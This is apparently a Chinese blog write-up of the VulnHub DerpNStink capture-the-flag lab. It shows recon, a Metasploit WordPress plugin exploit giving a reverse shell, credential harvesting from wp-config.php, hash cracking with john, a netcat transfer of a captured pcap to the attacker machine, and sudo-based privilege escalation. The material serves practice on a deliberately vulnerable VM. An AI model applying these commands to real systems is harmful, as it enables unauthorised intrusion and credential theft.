> 本文由 [简悦 SimpRead](http://ksria.com/simpread/) 转码， 原文地址 [mp.weixin.qq.com](https://mp.weixin.qq.com/s/LSsWSmzVRNETDsd2RImjTA)

![](https://mmbiz.qpic.cn/mmbiz_png/Hju2o35jBmTq6KFH2V0l2rpO9o6GicBiaYibgkMVJKERutggHic6HP3Cv9MbAmNwCsjW8knnZZgmA1yceegAFSN4OA/640?wx_fmt=png)

靶机地址：https://www.vulnhub.com/entry/derpnstink-1,221/

靶机难度：中级（CTF）

靶机发布日期：2018 年 2 月 9 日

靶机描述：This is a boot2root Ubuntu based virtual machine. It was tested on VMware Fusion and VMware Workstation12 using DHCP settings for its network interface. It was designed to model some of the earlier machines I encountered during my OSCP labs also with a few minor curve-balls but nothing too fancy. Stick to your classic hacking methodology and enumerate all the things!

Your goal is to remotely attack the VM and find all 4 flags eventually leading you to full root access. Don't forget to #tryharder

Example: flag1(AB0BFD73DAAEC7912DCDCA1BA0BA3D05). Do not waste time decrypting the hash in the flag as it has no value in the challenge other than an identifier.

**目标：**得到 root 权限 & 找到 四个 flag.txt

请注意：对于所有这些计算机，我已经使用 VMware 运行下载的计算机。我将使用 Kali Linux 作为解决该 CTF 的攻击者机器。这里使用的技术仅用于学习教育目的，如果列出的技术用于其他任何目标，我概不负责。

![](https://mmbiz.qpic.cn/mmbiz_png/IhUDNJicR5NCFnPJhYUTqib6NmY4leia2t3Fs2QenHUiaZRPguibTFokOE3Lput5g5a5tTlkf5GagGpiaojrZrVtnXvA/640?wx_fmt=png)

一、信息收集

![](https://mmbiz.qpic.cn/mmbiz_png/F5fjqXxeV4BpyqyFY96joAs95uctK5C40icC7GfefCs1Unjrp7ZaVd90g37d8gDNic1qgtwTFLM9V2ydbH8Zvwdg/640?wx_fmt=png)

我们在 VM 中需要确定攻击目标的 IP 地址，需要使用 nmap 获取目标 IP 地址：

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KMAVke91NS1csbVjA1vwz57FicI6V3WVVlCGtQ2Cgs5cY9LUI54h7Uc3IokuL813ibb210BSateKGWg/640?wx_fmt=png)

我们已经找到了此次 CTF 目标计算机 IP 地址：

```
192.168.182.147
```

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KMAVke91NS1csbVjA1vwz57giajf79ROODT96vgLHLP1LCLjs09odTPxiamqLK3HZduoDS2qoG7TT3w/640?wx_fmt=png)

只开了三种服务：FTP，SSH 和 HTTP....

直接访问 80 端口

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KMAVke91NS1csbVjA1vwz57cDcCgH3lqk4pCsiaOf50aFB5fhEVzkbgA2oKJoG51ibGxcoiamfeZungA/640?wx_fmt=png)

一个胖子一个瘦子....

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KMAVke91NS1csbVjA1vwz57RE2OvXbRsgt67jpDr1HTWuPTWBMjw8P6p0ap8whBH9leIJw7YGYE4A/640?wx_fmt=png)

作者真调皮.... 弄个旗帜....flag1 很顺利的找到了

```
flag1=52E37291AEDF6A46D7D0BB8A6312F4F9F1AA4975C248C3F0E008CBA09D6E9166
```

不用说，继续找 flag2

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KMAVke91NS1csbVjA1vwz57SWq1spLTgfPeaXUMwILuEeDkgAtf0qyxUTXVRJebcvbe02FbyKHU4w/640?wx_fmt=png)

源代码还有个有用信息（图中红框）

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KMAVke91NS1csbVjA1vwz57bs1pq3u87UzsJpTQKnicbe1nIDo7pULoqGcnm2rs8QcKGJzjcszWl6g/640?wx_fmt=png)

```
<-- @stinky, make sure to update your hosts file with local dns so the new derpnstink blog can be reached before it goes live -->
```

意思是要我们更新本地的 dns 服务，才能访问博客

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KMAVke91NS1csbVjA1vwz57NhVYmH6owiby3mFU6ITcD1pZ8ic7AjapFGIGjhndgPiaQGKy0G30krsyw/640?wx_fmt=png)

192.168.182.147  derpnstink.local 写入本地 hosts 中即可

然后对目录进行爆破

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KMAVke91NS1csbVjA1vwz5791Ca7S0bUULrJFqmw5TzN4xj0zoZVAhk5s7ePZ2WbAVdEN523ISicpQ/640?wx_fmt=png)

在 dirb 找到的所有文件中，第一个是 robots.txt

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KMAVke91NS1csbVjA1vwz579uJqcTMGgfvTQDj1bxWOL5Y84QNHYovBKoMtHFoJ2fMtpeOgE62dyQ/640?wx_fmt=png)

仅包含文件夹 / php / 和 / temporary/，这两个文件夹 dirb 都已找到了....

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KMAVke91NS1csbVjA1vwz57OlDS6cd3myicnvDL5QzXjACIrs8NPm51icbbhtbQWUWOzVichT7MgMfFQ/640?wx_fmt=png)

该文件 / temporary/index.html 没有任何有用的信息…… 让我加油....!!

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KMAVke91NS1csbVjA1vwz57BicriarvSywzkHcNRibgLaYTkyeqa218sxGdfsvGCnP7A5WbEE8gQg9Sg/640?wx_fmt=png)

访问目录 / weblog/

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KMAVke91NS1csbVjA1vwz57EWFia3W2XMrSWw62fBx9FmywbXyqiaTW7icKIcy3cJia3nuvNgCEXdZeow/640?wx_fmt=png)

前面是介绍 Mr. Derp 和 Uncle Stinky 的故事

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KMAVke91NS1csbVjA1vwz579ibg87MHfGibT9Xt6aVZegDVUOXibDvibrnRD0FdMTrADiaAkLbWiblx3UoQ/640?wx_fmt=png)

直接访问 / weblog/wp-admin / 目录，使用默认账号密码 admin 访问，成功登陆，但是，此管理员用户不是 WordPress 的实际管理员，并且缺少大多数管理权限…… 用户权限只能管理幻灯片....

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KMAVke91NS1csbVjA1vwz57XP8oNQAFaAf4zupEyib9ZgWg5css1bIxvtR2AwhV4ic1Eb52uX8yzibwQ/640?wx_fmt=png)

命令：

```
wpscan --url 'http://derpnstink.local/weblog/'
```

Wpscan 扫描后，Slideshow Gallery 插件插件可以利用

二、提权

![](https://mmbiz.qpic.cn/mmbiz_png/F5fjqXxeV4BpyqyFY96joAs95uctK5C40icC7GfefCs1Unjrp7ZaVd90g37d8gDNic1qgtwTFLM9V2ydbH8Zvwdg/640?wx_fmt=png)

我们使用 metasploit 来利用此漏洞

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KMAVke91NS1csbVjA1vwz57C8drOkazES8qtaliaUYTLP3a1yVM2afrfn8HXaefMTmYEpEib56Oaddw/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KMAVke91NS1csbVjA1vwz57VqxIiaxZfWbexdn4Y9ZVdgjoiaFVImeeV5YgJZnK8qnohXFQNlLnFA7Q/640?wx_fmt=png)

取得反向外壳后，打开 wp-config.php 并找到数据库的名称和访问数据库所需的用户

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KMAVke91NS1csbVjA1vwz57VST35Y9scZADicKia60AVW7VwAR0Eu2pO3Qo47ElJQibeoic5SUfbfcfow/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KMAVke91NS1csbVjA1vwz57ibF0Iw5PuBEaDBFQOZhO5MPYUImOZnGcyiaNG8sYzKURebfXHusJ7oPw/640?wx_fmt=png)

查看发现数据库账号密码

```
root/mysql
```

前面 wepcan 扫描图中，可以看到列举了 34514.c 可以利用此 shell 进行提权

还可以使用 msfvenom 生成一个 PHP 反向外壳，然后使用 admin 用户上传文件，进行提权

还有很多提权的方法，这边我不介绍了，最近开始进攻 oscp 了

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KMAVke91NS1csbVjA1vwz57UpIQDWSkgxCk0te5ptB8fL48wM9ZchF4enhICrlVQke2swVGf8nZlA/640?wx_fmt=png)

直接登录访问数据库！！

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KMAVke91NS1csbVjA1vwz57Qk86SfibMhpP4XU7pAMZLswib6bjDPnkCicZt9k55IsthfQDY5Mu46mmQ/640?wx_fmt=png)

在 wp-posts 中找到了 flag2.txt ：

```
flag2(a7d355b26bda6bf1196ccffead0b2cf2b81f0a9de5b4876b44407f1dc07e51e6)
```

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KMAVke91NS1csbVjA1vwz57fEbu8ngLFRk4TNaxgOEiaBDBExshkDhjL0XLs8qeibhR8OqY9TDkzhNg/640?wx_fmt=png)

在 user 有第二个账户

这边我们还可以进入数据库底层查看信息...

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KMAVke91NS1csbVjA1vwz578YtXEoT43I7uXakUKHLb7iaChy7wictibKLiatMJHUtQgBqCvDQEZN3WMg/640?wx_fmt=png)

这里命令我就不多解释了，前面写的几篇文章有说过...

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KMAVke91NS1csbVjA1vwz577RQSSD4EWdowvYepbheu0cs2IWic10mUYFeTG8shNH9icPWRRUhiaJ5xw/640?wx_fmt=png)

查看到有多个账户...

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KMAVke91NS1csbVjA1vwz57H2ac2QLucpNKdMAFduUmlGEmiaURlKLIYVyFsrOicia31HpHk8zyWwQ3w/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KMAVke91NS1csbVjA1vwz57SC3cLpln9SNV2jQnq9dx54EO2byTwr2l7bOzwtElAFriaUks0iaUuByA/640?wx_fmt=png)

数据库也看到了第二个账户的信息....

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KMAVke91NS1csbVjA1vwz57hXJgLGwibGd0bXkeLk1Vb6bnCs8jwHNZ7PxfIJibM4PrYB5YmyPo37Iw/640?wx_fmt=png)

```
echo '$P$BW6NTkFvboVVCHU2R9qmNai1WfHSC41' >> hash.hash
john hash.hash --wordlist=/usr/share/wordlists/rockyou.txt
john hash.hash --show
```

使用开膛手进行爆破，这边如果没有 rockyou.txt 库的，可以去 github 下载

使用爆破出的用户名 / 密码：unclestinky/wedgie57 进行登录

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KMAVke91NS1csbVjA1vwz57SEccQ01MK2rAghsgRtkRxdLN1o68j88mujAL64XPT7IETVhsUzHAHw/640?wx_fmt=png)

登录后在主页也发现了 flag2 的信息，前面也发现过了

```
flag2(a7d355b26bda6bf1196ccffead0b2cf2b81f0a9de5b4876b44407f1dc07e51e6)
```

继续寻找 flag3.txt

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KMAVke91NS1csbVjA1vwz57dw7PfibR0xlz17u9G9coaBczTFBwdMHLpZJibLlCDwOOCy2umYlsdALQ/640?wx_fmt=png)

发现底层有 mrderp 和 stinky 两个用户

前面 nmap 扫描出了 21：ftp 端口，尝试用 wedgie57 登录试试

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KMAVke91NS1csbVjA1vwz57MBgvV9kZBPRXnVqTVB6LCpu0ic07iab2bAHXlSCPP0xriazzMTp6KNCMA/640?wx_fmt=png)

这里用户 stinky 是成功的，我这边对 ftp 命令还不太熟悉，我进 web 图形化操作

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KMAVke91NS1csbVjA1vwz57kQQFgrUm8ocTDKYnTpV0z5IQicUpqQgAgr5YvfRhXWzYh9Cu1cjAzTA/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KMAVke91NS1csbVjA1vwz57Zz9vw8keYw1lhOH8SKkaEyAhibA1GBJPkEoKlLGjcYGztUqCbdJeHVQ/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KMAVke91NS1csbVjA1vwz57YAoXib2OFWPKdfjyVO0Q4AgZoCPGIb6oUK3WxHkNx3ZllJ23ic9R047g/640?wx_fmt=png)

没啥有用的信息....

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KMAVke91NS1csbVjA1vwz57Rh6ITBYFovaxQlZicoRT7bYzictPlGmM2IicvIrnCOm693uWPyKLFeHmg/640?wx_fmt=png)

这边找到了 key 密匙，进行解密试试

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KMAVke91NS1csbVjA1vwz57UFs1JUibEGlppwMnpCyR1xF5XdhKC0rSPQK300WIGQyd7cDezrElMbA/640?wx_fmt=png)

权限不够.... 加权即可

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KMAVke91NS1csbVjA1vwz57pKHX42mSOzKqFFIXELZ9TWcqraPx3ZpyuZxhtIw4xEJ9qrib7icA5T0g/640?wx_fmt=png)

这边已经登录了

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KMAVke91NS1csbVjA1vwz57lm4SC8f97RYql8skujrzFIGCohYWCsHxCTFXz42fViaiblSicF8pRJfKQ/640?wx_fmt=png)

刚想一个一个文件看过去，第一个文件就给我找到了 flag3 信息

```
flag3(07f62b021771d3cf67e2e1faf18769cc5e5c119ad7d4d1847a11e11d6d5a7ecb)
```

继续找 flag4

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KMAVke91NS1csbVjA1vwz57aWa3zPgFA9btPI9icyy9ibY8VcZKkoiapXo8LNrhUicxa0sXNyrm9qyia6g/640?wx_fmt=png)

命令：strings Documents/derpissues.pcap | grep mrderp

继续查看第二个文件夹发现个 pcap 文件，进入查看获得用户 mrderp，把文件拷出到本地，用 wireshark 查看试试

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KMAVke91NS1csbVjA1vwz57sibxmCL0ZJ6btbMkN5pP6iaag3UZPILjBSt2hxaHAuBXCrD2Dj8ChVAg/640?wx_fmt=png)

```
nc 192.168.182.149 4444 < derpissues.pcap
```

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KMAVke91NS1csbVjA1vwz57Exv3icOxDOVQChwagABGRjvY4eEQd9GmRwEgMUlA7KYD5PHQxibOB1FA/640?wx_fmt=png)

```
nc -l -p 4444 > derp.pcap
```

导出后打开...  

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KMAVke91NS1csbVjA1vwz57mmgkWpZHAS5MPWiax6IZKBC77YfXOyEUIGBrDayPmThQt55Ptwhz1Ag/640?wx_fmt=png)

这里信息量很大，需要耐心寻找

选择 http 流量筛选，一个一个找下去...

找到了密码：

```
derpderpderpderpderpderpderp
```

进行登录！！！

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KMAVke91NS1csbVjA1vwz57mXMFaqHiabG6vDU736wF3Ur9phgNWIIBiaOqEBvajqd255JXWcCFDBSg/640?wx_fmt=png)

成功登录....

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KMAVke91NS1csbVjA1vwz57RLNZeibwCFNw2RXafhPGlAj0Z3GLX6mPU2U60ticqBRAYMUBiadLN2xnQ/640?wx_fmt=png)

查看

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KMAVke91NS1csbVjA1vwz57DzsM6IEsE1fQLdbeRGESicsHib65d7NMoiarSlj8pV0A1JddYMVQFRQNA/640?wx_fmt=png)

```
Sudoers File issues
Self Help Web page at https://pastebin.com/RzK9WfGw
```

意思是让我们访问地址

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KMAVke91NS1csbVjA1vwz57UqRxfdTCsWV03iaz4hiawgIdLCjHr40y5QVbEGofeV5Vdx5gNoPDgdmQ/640?wx_fmt=png)

链接，显示了 sudo

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KMAVke91NS1csbVjA1vwz57ZDY4Fibp9Q1ibjhQqwEkg11GPPhGAAPxQkXmAp8OjXpL0l3Yia1n5upkA/640?wx_fmt=png)

提示可以在靶机下运行 derpy 二进制

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KMAVke91NS1csbVjA1vwz57T2DQXnj1vffSJz4ZBbRs5s6Yg8AmPh4gLALMibgB6Hhw0qIjrJib0BQg/640?wx_fmt=png)

这边创建个相同目录，然后创建文件，随意写入二进制代码

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KMAVke91NS1csbVjA1vwz574PgdJJCSm0r1rFkDXTUibRMEY3PCoKbrCyibyzC9k8rpY8aGvRqQrWuw/640?wx_fmt=png)

创建完保存退出后

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KMAVke91NS1csbVjA1vwz57790dVRfkGpU3ELBoCZyj6AWlGHENaiaqa80cjuTytskvAC0kibZbs6Zw/640?wx_fmt=png)

运行 perty.sh 后，提权成功...

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KMAVke91NS1csbVjA1vwz57zcrrwqsflP0BrA7icE2Gb9nTfJvvQRCibGnjkM6sZiax5gE82M1uXykLQ/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KMAVke91NS1csbVjA1vwz57QSqWmGKUknQdlNKuUnHgjytqWicgHXztsAwibOb8ibWvWhrS9L5MnDtHQ/640?wx_fmt=png)

```
flag4(49dca65f362fee401292ed7ada96f96295eab1e589c52e4e66bf4aedda715fdd)
```

![](https://mmbiz.qpic.cn/mmbiz_png/Hju2o35jBmTq6KFH2V0l2rpO9o6GicBiaYibgkMVJKERutggHic6HP3Cv9MbAmNwCsjW8knnZZgmA1yceegAFSN4OA/640?wx_fmt=png)

写这篇文章还是加深了很多技术的知识，中间有很多种渗透的方法可以执行，涉及了很多细节知识点，希望喜欢渗透的好好专研！！！

由于我们已经成功得到 root 权限 & 找到四个 flag.txt，因此完成了 CTF 靶机，希望你们喜欢这台机器，请继续关注大余后期会有更多具有挑战性的机器，一起练习学习。

如果你有其他的方法，欢迎留言。要是有写错了的地方，请你一定要告诉我。要是你觉得这篇博客写的还不错，欢迎分享给身边的人。

![](https://mmbiz.qpic.cn/mmbiz_png/IhUDNJicR5NCFnPJhYUTqib6NmY4leia2t3Fs2QenHUiaZRPguibTFokOE3Lput5g5a5tTlkf5GagGpiaojrZrVtnXvA/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KPqjaFWwyrrhiciahSpOibxqKvSIFX0iaPcG00CjYIwQDwIDeIicmFMlOVNyhWYVSE8pJK566UK3YOUNWQ/640?wx_fmt=png)

星球每月都有网络安全书籍赠送、各种渗透干货分享、小伙伴们深入交流渗透，一起成长学习！

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KPqjaFWwyrrhiciahSpOibxqKvyRzpZ9K5N6QrjibbJsVd3xX7Q4wDYSsBJYyNJdyjYabp5NkcDj9GEhA/640?wx_fmt=png)

欢迎加入渗透学习交流群，想入群的小伙伴们加我微信，共同进步共同成长！

渗透攻防：  

欢迎加入

大余安全

公众号

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KPqjaFWwyrrhiciahSpOibxqKvX3CVuhiba4mw8DqJicOMwaDJyErymjibZhiaZNKMtWzn2rX17pcK3Cd7Cw/640?wx_fmt=png)